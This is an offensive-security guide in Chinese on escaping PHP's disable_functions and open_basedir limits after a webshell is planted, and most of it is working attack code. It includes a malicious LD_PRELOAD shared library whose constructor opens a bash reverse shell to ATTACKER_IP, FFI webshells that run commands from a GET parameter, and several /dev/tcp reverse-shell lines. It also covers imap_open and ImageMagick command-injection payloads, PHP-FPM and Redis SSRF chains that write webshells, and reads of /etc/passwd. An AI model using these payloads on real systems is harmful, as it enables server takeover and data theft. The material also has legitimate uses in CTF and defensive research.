# PHP disable_functions Bypass — PHP 函数禁用绕过全集

> PHP 的 `disable_functions` 是 webshell 利用中最常见的障碍——`system`/`exec`/`passthru` 全被禁用时的突破技术。从 LD_PRELOAD 劫持到 FFI 直接调用，从 UAF 利用到 PHP-FPM 注入——本指南覆盖已知的全部突围路径。

## 关键词

`disable_functions` `disable_functions绕过` `LD_PRELOAD` `FFI` `PHP7.4` `UAF` `GC` `imap_open` `CVE-2018-19518` `sendmail` `mail劫持` `PHP-FPM` `FastCGI` `open_basedir绕过` `chdir` `symlink` `glob绕过` `pcntl_exec` `COM` `Windows绕过` `dl` `extension` `SplDoublyLinkedList`

---

## 1. 环境探测

### 1.1 确认受限范围

```php
<?php
// 单点测试
var_dump(function_exists('system'));       // false → 被禁用
var_dump(function_exists('exec'));
var_dump(function_exists('passthru'));
var_dump(function_exists('shell_exec'));
var_dump(function_exists('popen'));
var_dump(function_exists('proc_open'));
var_dump(function_exists('pcntl_exec'));
var_dump(function_exists('dl'));
var_dump(ini_get('disable_functions'));    // 全量查看禁用列表
var_dump(ini_get('open_basedir'));         // 查看目录限制
var_dump(ini_get('disable_classes'));      // 查看禁用类

// 未禁用的高危函数检查
var_dump(function_exists('putenv'));        // LD_PRELOAD 必需
var_dump(function_exists('mail'));          // LD_PRELOAD / sendmail
var_dump(function_exists('error_log'));     // error_log + mail 同原理
var_dump(function_exists('mb_send_mail'));
var_dump(function_exists('imap_open'));     // CVE-2018-19518
var_dump(function_exists('ffi::cdef'));     // FFI → 直接调 libc
var_dump(function_exists('imagecreatefromgif'));  // Imagick fallback
var_dump(class_exists('COM'));             // Windows 特有

// PHP 版本与信息
phpversion();
php_uname();
PHP_SAPI;     // apache2handler → Apache, fpm-fcgi → PHP-FPM
PHP_OS;       // WINNT / Linux
PHP_INT_SIZE; // 4=32bit / 8=64bit
```

### 1.2 限制等级判定

```
Level 0: 无限制 → 直接用 system/exec/passthru
Level 1: system/exec 禁用, 但 proc_open/popen 可用 → 仍可执行
Level 2: 全部 RCE 函数禁用, 但 dl() 可用 → 加载自定义扩展
Level 3: dl() 也禁用, 但 putenv/mail 可用 → LD_PRELOAD
Level 4: mail 也禁用, 但有 FFI → FFI::cdef
Level 5: 仅剩基础函数 → UAF / imap_open / ImageMagick 等 CVE
Level 6: Windows + COM → COM('WScript.Shell')
```

---

## 2. LD_PRELOAD 劫持

### 2.1 原理

PHP 调用 `mail()` 时，`sendmail_path` 指定的外部程序通过 `execve()` 执行——内核在加载动态链接时会遵循 `LD_PRELOAD` 环境变量，优先加载指定的 `.so` 文件。

```
PHP mail() → execve(sendmail) → ld.so → LD_PRELOAD=evil.so → evil.so 的构造函数先执行 → system("bash -c 'exec bash -i &>/dev/tcp/x/port <&1'")
```

### 2.2 利用流程

```bash
# Step 1: 写恶意 .so 到可写目录 (/tmp, /var/tmp, uploads/)
cat > evil.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void evil_init() {
    unsetenv("LD_PRELOAD");
    // 反弹 shell 或执行命令
    system("bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/4444 0>&1'");
    // 或简单写文件验证:
    // system("touch /tmp/pwned_by_ldpreload");
    // 或直接读 flag:
    // system("cat /flag > /var/www/html/out.txt");
}
EOF

gcc -shared -fPIC evil.c -o evil.so
# 静态编译避免 glibc 依赖问题:
# gcc -shared -fPIC evil.c -o evil.so -static-libgcc -static
```

```php
<?php
// Step 2: 上传 evil.so 后, PHP 触发
putenv('LD_PRELOAD=/tmp/evil.so');
mail('a', 'b', 'c');  // 触发 sendmail → evil.so 加载 → 命令执行

// error_log 同理
error_log('test', 1, 'admin@x.com');  // 也触发 sendmail

// mb_send_mail 同理
mb_send_mail('a', 'b', 'c');
?>
```

### 2.3 兼容性

| 条件 | 要求 |
|------|------|
| PHP SAPI | Apache/FPM/CLI 均可 |
| `putenv()` | 必须可用 |
| `mail()` / `error_log()` | 至少一个可用 |
| `/tmp` 可写 | 或任何可写目录 |
| 编译环境 | 需和目标 glibc 版本兼容 |

---

## 3. FFI (Foreign Function Interface) — PHP 7.4+

### 3.1 原理

PHP 7.4 引入 FFI，允许直接从 PHP 调用 C 库函数。如果 `ffi.enable=true`（`preload` 或 `true`），可以调用 `libc` 的 `system()`。

```php
<?php
// 最简 FFI webshell
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system($_GET['cmd']);

// 读取文件
$ffi = FFI::cdef("int system(const char *cmd);", "libc.so.6");
$ffi->system("cat /flag > /tmp/out.txt");

// 反弹 shell
$ffi = FFI::cdef("int system(const char *cmd);", "libc.so.6");
$ffi->system("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");

// popen 方式（获取输出）
$ffi = FFI::cdef("
    void* popen(const char *cmd, const char *type);
    char* fgets(char *s, int size, void *stream);
    int pclose(void *stream);
", "libc.so.6");

$handle = $ffi->popen("whoami", "r");
$output = FFI::new("char[1024]");
$ffi->fgets($output, 1024, $handle);
echo FFI::string($output);
$ffi->pclose($handle);
```

### 3.2 无 FFI 常量的替代调用

```php
<?php
// 如果 FFI 常量不可用但扩展已加载
$ffi = \FFI::cdef('int system(const char *command);', 'libc.so.6');
$ffi->system('id');

// 多行调用
$ffi = \FFI::cdef('
    int system(const char *cmd);
    void* popen(const char *cmd, const char *type);
    char* fgets(char *buf, int size, void *fp);
    int pclose(void *fp);
', 'libc.so.6');

$fp = $ffi->popen('whoami; id', 'r');
$buf = \FFI::new('char[4096]');
$ffi->fgets($buf, 4096, $fp);
echo \FFI::string($buf);
$ffi->pclose($fp);
```

### 3.3 Windows FFI

```php
<?php
// Windows: 调用 kernel32.dll
$ffi = \FFI::cdef('
    int system(const char *command);
    int WinExec(const char *cmd, int show);
', 'msvcrt.dll');

$ffi->system('whoami');
$ffi->WinExec('calc.exe', 1);
```

---

## 4. UAF (Use-After-Free) 利用

### 4.1 GC + SplDoublyLinkedList

```
适用版本: PHP 7.0 - 7.3 (部分修复), PHP 7.4 - 8.x (不同 gadget)

核心思路:
1. 触发 GC 对 SplDoublyLinkedList 的 UAF
2. 用内存占位替换 freed chunk
3. 劫持函数指针 → 执行命令
```

### 4.2 利用脚本（来自开源工具）

```bash
# 使用 exploit 脚本
# https://github.com/mm0r1/exploits
python3 pwn.php7.py --target http://target/shell.php --cmd "cat /flag"
# 自动探测版本、生成 payload
```

### 4.3 手动探测

```php
<?php
// 内存探测 → 确认是否存在 UAF
$size = 7;
$serial = str_repeat("A", $size * 8);
// ... 利用因版本差异大，推荐直接用成熟 exploit 框架
```

---

## 5. imap_open() 利用

### 5.1 CVE-2018-19518 原理

`imap_open()` 在建立 IMAP 连接时会调用 `/usr/libexec/imapd` 或 `rsh`。通过构造特殊的 `mailbox` 参数可以注入命令。

```php
<?php
// 基本 payload
$server = "x -oProxyCommand=echo\t" . base64_encode('whoami') . "|base64\t-d|sh}";
imap_open('{'.$server.':993/imap}INBOX', '', '');

// 反弹 shell
$cmd = base64_encode("bash -i >& /dev/tcp/IP/PORT 0>&1");
$server = "x -oProxyCommand=echo\t{$cmd}|base64\t-d|sh}";
imap_open('{'.$server.':993/imap}INBOX', '', '');
```

### 5.2 前置条件

- `imap_open()` 未被禁用
- PHP 未使用硬编码路径的 proxy（某些发行版安全配置）
- Debian/Ubuntu 默认安装 mpop/uw-imap

---

## 6. PHP-FPM / FastCGI 直接攻击

### 6.1 原理

PHP-FPM 监听在 `127.0.0.1:9000`（或 Unix socket）。如果存在 SSRF 或任意 socket 连接能力，可以直接向 PHP-FPM 发送 FastCGI 协议包，设置 `PHP_VALUE: auto_prepend_file = php://input`，POST body 即为 PHP 代码。

```python
# 使用 Gopherus 生成 Gopher payload
# python3 gopherus.py --exploit php_fpm

# 手工构造 FastCGI + PHP_VALUE 注入
# FCGI_BEGIN_REQUEST + FCGI_PARAMS(PHP_VALUE: auto_prepend_file = php://input) →
#   POST: <?php system('id'); ?>
```

### 6.2 触发方式

```bash
# SSRF → Gopher
gopher://127.0.0.1:9000/_%01%01%00%01...

# curl (支持 gopher)
curl gopher://127.0.0.1:9000/_FASTCGI_PAYLOAD

# Redis + SSRF 二次跳转
# 1. Gopher → Redis → SLAVEOF → Rogue Server → MODULE LOAD → system.exec
# 2. Gopher → Redis → CONFIG SET dir /var/www/html → CONFIG SET dbfilename shell.php → SET key "<?php ..." → BGSAVE
```

---

## 7. 其他绕过技术

### 7.1 pcntl_exec()

```php
<?php
// 如果 pcntl_exec() 未被禁用且 SAPI=CLI
pcntl_exec('/bin/bash', ['-c', 'bash -i >& /dev/tcp/IP/PORT 0>&1']);
```

### 7.2 dl() 加载自定义扩展

```php
<?php
// 上传自定义 .so 扩展
dl('/tmp/evil.so');  // 自定义扩展注入
// .so 需要提供自定义 PHP 函数（如 custom_exec）
```

### 7.3 Windows COM 对象

```php
<?php
// Windows + COM
$com = new COM('WScript.Shell');
$com->Run('cmd.exe /c whoami > C:\inetpub\wwwroot\out.txt', 0, false);

// 或
$com = new COM('Shell.Application');
$com->ShellExecute('cmd.exe', '/c whoami', '', 'open', 0);
```

### 7.4 ImageMagick 利用（CVE-2016-3714）

```php
<?php
// ImageMagick < 6.9.3-9 的 delegate 注入
// 构造 mvg 文件:
// push graphic-context
// viewbox 0 0 640 480
// fill 'url(https://example.com/image.jpg"|whoami")'
// pop graphic-context
// 当 Imagick 解析此 mvg → 执行 whoami

$im = new Imagick();
$im->readImage('exploit.mvg');  // delegate 触发命令执行
```

### 7.5 Apache mod_cgi + ShellShock

```bash
# 如果目标有 mod_cgi 且 bash 版本 < 4.3
# User-Agent: () { :; }; /bin/bash -c 'whoami'
# PHP 发起 curl 到同机 CGI → ShellShock 触发
```

---

## 8. open_basedir 绕过

### 8.1 绕过技术清单

```php
<?php
// ====== 1. chdir + ini_set ======
chdir('/tmp'); ini_set('open_basedir', '..');

// ====== 2. symlink 绕过 ======
symlink('/etc/passwd', '/tmp/link');
// 如果 /tmp 在 basedir 内 → 读取成功

// ====== 3. glob:// 绕过 ======
// glob:// 伪协议遍历在 PHP < 5.4 中不受限制
$it = new DirectoryIterator('glob:///*');
foreach($it as $f) echo $f.PHP_EOL;

// ====== 4. exec 的 bypass → 直接用外部进程读 ======
// 如果绕过了 disable_functions, open_basedir 对 exec/system 无效
system('cat /etc/passwd');

// ====== 5. FFI bypass ======
// FFI 直接调用 libc 读写不受 PHP 限制
$ffi = FFI::cdef('int system(const char *s);', 'libc.so.6');
$ffi->system('cat /etc/passwd');
```

---

## 9. 关联技术

- [[02-webshell]] — Webshell 免杀
- [[01-command-injection]] — 命令注入
- [[04-reverse-shell-bind]] — 反弹 Shell
- [[05-chain-playbook]] — 漏洞→Shell 链
- [[deserialization]] — 反序列化
- [[ssrf]] — SSRF → PHP-FPM/Gopher
